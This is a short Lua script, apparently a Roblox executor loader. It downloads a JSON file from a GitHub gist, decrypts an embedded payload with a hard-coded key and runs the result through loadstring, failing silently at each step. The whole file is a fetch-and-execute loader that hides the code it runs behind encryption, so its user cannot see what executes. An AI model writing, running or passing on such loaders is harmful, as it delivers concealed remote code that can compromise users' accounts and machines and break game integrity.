-- 9/13/2026

local b = game:GetService("HttpService")

local Loader = "https://gist.githubusercontent.com/LOL5678906/9c8fc3cc3b5b0ab220dec4c98d5e5be6/raw/9106f7627fd94f46c0ccf13b493f303be06cfe25/OneShotRecipe.JSON"
LoaderV1 = Loader .. "?t=" .. tick()

local K = table.concat({ "OUZpTVAyUFNsd3dyV1R0Z1R2OVNDNXVFbzFXUDB4WHk=" })

local ok1, raw = pcall(function()
    return game:HttpGet(LoaderV1)
end)
if not ok1 or type(raw) ~= "string" then return end

local ok2, outer = pcall(function()
    return b:JSONDecode(raw)
end)
if not ok2 or type(outer) ~= "table" then return end

local ok3, src = pcall(function()
    return crypt.decrypt(outer.p, K, outer.i)
end)
if not ok3 or type(src) ~= "string" then return end

local chunk = loadstring(src, "=build")
if not chunk then return end

chunk()
